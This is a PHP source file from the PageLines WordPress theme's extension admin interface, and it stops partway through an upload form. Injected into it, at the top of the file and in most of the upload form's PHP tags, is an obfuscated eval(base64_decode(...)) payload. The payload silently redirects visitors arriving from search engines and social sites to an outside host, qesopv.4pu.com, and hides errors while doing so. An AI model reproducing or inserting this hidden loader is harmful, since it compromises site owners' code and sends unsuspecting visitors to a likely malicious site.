<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * 
 *
 *  Extend Control Interface
 *
 *
 *  @package PageLines Admin
 *  @subpackage OptionsUI
 *  @since 2.0.b9
 *
 */


class PageLinesExtendUI {
	

	/**
	 * Construct
	 */
	function __construct() {
		
		$this->exprint = 'onClick="extendIt(\'%s\', \'%s\', \'%s\', \'%s\', \'%s\', \'%s\', \'%s\')"';
		
		$this->defaultpane = array(
				'name' 		=> 'Unnamed', 
				'version'	=> 'No version', 
				'active'	=> false,
				'desc'		=> 'No description.', 
				'auth_url'	=> 'http://www.pagelines.com',
				'auth'		=> 'PageLines',
				'image'		=> PL_ADMIN_IMAGES . '/thumb-default.png',
				'buttons'	=> '',
				'key'		=> '',
				'type'		=> '',
				'count'		=> '',
				'status'	=> '',
				'actions'	=> array(), 
				'screen'	=> '',
				'screenshot'=> '',
				'extended'	=> '',
				'slug'		=> '',
				'long'		=> '',
				'external'	=> '',
				'demo'		=> ''
		);
		
		/**
		 * Hooked Actions
		 */
		add_action('admin_head', array(&$this, 'extension_js'));
		
	}

	/**
	 * Draw a list of extended items
	 */
	function extension_list( $args ){
			
		$defaults = array (

			'list'		=> array(),
			'type'		=> 'addon',
			'tab'		=> '',
			'mode'		=> '',
			'ext'		=> '',
			'active'	=> ''
			);
			
		$list = wp_parse_args( $args, $defaults );
			
		if( empty( $list['list'] ) ) {
			if ( $list['tab'] == 'installed' )
				return $this->extension_banner( sprintf( __( 'Installed %s will appear here.', 'pagelines' ), $list['type'] ) );
			else
				return $this->extension_banner( sprintf( __( 'Available %s %s will appear here.', 'pagelines' ), $list['tab'], $list['type'] ) );
		}

		$count = 1;
		if ( $list['mode'] == 'download' ) {
			
			foreach( $list['list'] as $eid => $e ){
				$list['ext'] .= $this->graphic_pane( $e, 'download', $count );
				$count++;
			}

			$output = sprintf('<ul class="graphic_panes plpanes fix"><div class="plpanes-pad">%s</div></ul>', $list['ext']);	
			return $output;		
		}
		
		
		if($list['mode'] == 'graphic'){
			
			$count = 1;
			foreach( $list['list'] as $eid => $e ){
				
				if(isset($e['active']) && $e['active'])
					$list['active'] .= $this->graphic_pane( $e, 'active', $count);
				else
					$list['ext'] .= $this->graphic_pane( $e, '', $count);
					
				$count++;
			}

			$output = sprintf(
				'<div class="graphic_panes plpanes fix"><div class="plpanes-pad">%s%s</div></div>', 
				$list['active'], 
				$list['ext']
			);
			
		} else {
			
			$count = 1;
			foreach( $list['list'] as $eid => $e ){
				$list['ext'] .= $this->pane_template( $e, $count );
				$count++;
			}
			$output = sprintf(
				'<div class="plpanes fix"><div class="plpanes-pad"><div class="plpanes-wrap">%s%s</div></div></div>', 
				$list['active'], 
				$list['ext']
			);
			
		}
			return $output;
	}
	
	function graphic_pane( $e, $style = '', $count = ''){
	
		$e = wp_parse_args( $e, $this->defaultpane);

		$image = sprintf( '<img class="" src="%s" alt="Thumb" />', $e['image'] );
		
		$title = sprintf('<h2>%s</h2>', $e['name']);
		
		$text = sprintf('<p>%s</p>', $e['desc']);
		
		$details = $this->grab_details( $e );
		
		$link =  $this->get_extend_buttons( $e, $style ) ;
		
		$dtitle = ($style == 'active') ? __('<h4>Active Theme</h4>', 'pagelines') : '';
					
		$alt = ($count % 2 == 0) ? 'alt_row' : '';			
					
		$out = sprintf(
			'<div class="%s %s plpane graphic_pane media fix">%s<div class="theme-screen img">%s</div><div class="theme-desc bd">%s%s<div class="pane-buttons">%s</div><div class="pane-dets">%s</div></div></div>', 
			$style, 
			$alt,
			$dtitle, 
			$image, 
			$title, 
			$text, 
			$link,
			join($details, ' <span class="pipe">|</span> ')
			
		);
		
	
		return $out;
		
	}
	
	function pane_template( $e, $count ){
		
		$demo = '';
		$external = '';
		$info = '';
		$auth = '';

		$s = wp_parse_args( $e, $this->defaultpane);
		
		// if we are 'core' tab or 'child' tab we dont want to see store urls or versions, they are pointless...
		$int = ( isset( $s['section']['type'] ) && ( $s['section']['type'] == 'parent' || $s['section']['type'] == 'custom') ) ? true : false;

	
		$alt = ($count % 2 == 0) ? 'alt_row' : '';
		
		$details = $this->grab_details( $s );
		
	
		// Thumb
		$thumb = sprintf( '<div class="pane-img-col"><div class="img paneimg"><img src="%s" alt="thumb" /></div></div>', $s['image'] );

		$title = sprintf(
			'<div class="pane-head"><div class="pane-head-pad"><h3 class="pane-title">%s</h3><div class="pane-buttons">%s</div></div></div>', 
			$s['name'], 
			$this->get_extend_buttons( $e )
		);

		$body = sprintf(
			'<div class="pane-desc"><div class="pane-desc-pad"><div class="pane-text">%s</div><div class="pane-dets"><div class="pane-dets-pad">%s</div></div></div></div>', 
			$s['desc'], 
			join($details, ' <span class="pipe">|</span> ')
		);
	

		$out = sprintf(
			'<div class="plpane %s"><div class="plpane-pad fix"><div class="plpane-box"><div class="plpane-box-pad fix">%s %s %s<div class="clear"></div></div> </div></div></div>', 
			$alt,
			$thumb, 
			$title, 
			$body
		);

		return $out;
		
	}

	function grab_details( $args ){
		
		$target = 'target="_blank"';
		$details = array();	
		if( 'internal' != $args['tab'] )
			$details['version']  = sprintf('<strong>v%s</strong>', $args['version']);

		$details['cred'] = sprintf('by <a %s href="%s">%s</a>', $target, $args['auth_url'], $args['auth']);

		if( 'internal' != $args['tab'] && 'integration' != $args['type'] )
			$details['overview'] = sprintf( '<a %s href="%s">Overview</a>', $target, $args['infourl'] );
	
		if ( $args['external'] )
			$details['homepage'] = sprintf( '<a %s href="%s">Homepage</a>', $target, $args['external'] );
	
		if ( $args['demo'] )
			$details['demo'] = sprintf( '<a %s href="%s">Demo</a>', $target, $args['demo'] );
			
		return $details;
	}

	
	function get_extend_buttons( $e, $style = 'small'){
		
		/* 
			'Mode' 	= the extension handling mode
			'Key' 	= the key of the element in the array, for the response
			'Type' 	= what is being extended
			'File' 	= the url for the extension/install/update
			'duringText' = the text while the extension is happening
		*/
		
		$buttons = '';
		foreach( $e['actions'] as $type => $a ){
			
			if($a['condition'])
				$buttons .= $this->extend_button( $e['key'], $a, $style);
			
		}
		
		return $buttons;
		
	}
	
	function extend_button( $key, $a, $style = 'small'){
		
		$d = array(
			'mode'	=> '',
			'case'	=> '', 
			'file'	=> '', 
			'text'	=> 'Extend',
			'dtext'	=> '',
			'key'	=> $key, 
			'type'	=> '',
			'path'	=> '',
			'product' => 0,
			'confirm'	=> false
		);
		
		$a = wp_parse_args($a, $d);
		
		$js_call = ( $a['mode'] == 'installed' ) ? '' : sprintf( $this->exprint, $a['case'], $a['key'], $a['type'], $a['file'], $a['path'], $a['product'], $a['dtext']);
		
		
		if($a['mode'] == 'deactivate' || $a['mode'] == 'delete' || $a['mode'] == 'installed' )
			$class = 'discrete';
		else 
			$class = '';
		
		if($style == 'superlink')
			$button = OptEngine::superlink( $a['text'], $a['mode'], '', '', $js_call);
		else
			$button = sprintf('<span class="extend_button %s" %s>%s</span>', $class, $js_call, $a['text']);
		
		return $button;
	}
	
	
	function install_button( $e ){
		
		
		$install_js_call = sprintf( $this->exprint, 'section_install', $key, 'sections', $key, __( 'Installing', 'pagelines' ) );

		$button = OptEngine::superlink( __( 'Install Section', 'pagelines' ), 'black', '', '', $install_js_call);
		
	}
	
	/**
	 * Draw a list of extended items
	 */
	function get_extend_plugin( $status = '', $tab = '' ){
		
		$key = 'ext'.$tab;
		
		$name = 'pagelines-sections';
		
		if($status == 'notactive'){
			$file = '/' . trailingslashit( $name ) . $name . '.php'; 
			$btext = 'Activate Sections';
			$text = sprintf( __( 'Sections plugin installed, now activate it!', 'pagelines' ) );
			$install_js_call = sprintf( $this->exprint, 'plugin_activate', $key, 'plugins', $file, '', '', __( 'Activating', 'pagelines' ) );
			
		} elseif($status == 'notinstalled'){
			$btext = __( 'Install It Now!', 'pagelines' );
			$text = __( 'You need to install and activate PageLines Sections Plugin', 'pagelines' );
	
			$install_js_call = sprintf( 
				$this->exprint, 
				'plugin_install', 
				$key, 
				'plugin', 
				'pagelines-sections', 
				'/pagelines-sections/pagelines-sections.php',
				'', 
				__( 'Installing', 'pagelines' ) 
			);
		}
			
		$eresponse = 'response'.$key;
		
		// The button
		$install_button = OptEngine::superlink($btext, 'blue', 'install_now iblock', '', $install_js_call);
		
		// The banner
		return sprintf('<div class="install-control fix"><span id="%s" class="banner-text">%s</span><br/><br/>%s</div>', $eresponse, $text, $install_button);
	}
	
	/**
	 * Draw a list of extended items
	 */
	function extension_banner( $text, $click = '', $button_text = 'Add Some &rarr;' ){
		
		if($click != ''){
			$thebutton = OptEngine::superlink($button_text, 'blue', 'install_now iblock', $click );
			$button = sprintf('<br/><br/>%s', $thebutton );
		
		} else 
			$button = '';
		
		// The banner
		return sprintf('<div class="install-control fix"><span class="banner-text">%s</span>%s</div>', $text, $button);
	}
	
	function upload_form( $type, $disabled = false ){
		
			$file = $type;
			
			if ( $disabled )
				return $this->extension_banner( __( 'Sorry uploads do not work with this server config, please use FTP!', 'pagelines' ) );

			if ( EXTEND_NETWORK )
				return $this->extension_banner( __( 'Only network admins can upload sections!', 'pagelines' ) );

		ob_start();
		 ?>
		<div class="pagelines_upload_form">
			<h4><?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); _e( 'Install a section in .zip format', 'pagelines' ) ?></h4>
			<p class="install-help"><?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); _e( 'If you have a section in a .zip format, you may install it by uploading it here.', 'pagelines' ) ?></p>
			<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); printf( '<form method="post" enctype="multipart/form-data" action="%s">', admin_url( 'admin.php?page=pagelines_extend' ) ) ?>
				<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); wp_nonce_field( 'pagelines_extend_upload', 'upload_check' ) ?>
				<label class="screen-reader-text" for="<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); echo $file;?>"><?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); _e( 'Section zip file', 'pagelines' ); ?></label>
				<input type="file" id="<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); echo $file;?>" name="<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); echo $file;?>" />
				<input type="hidden" name="type" value="<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); echo $file;?>" />
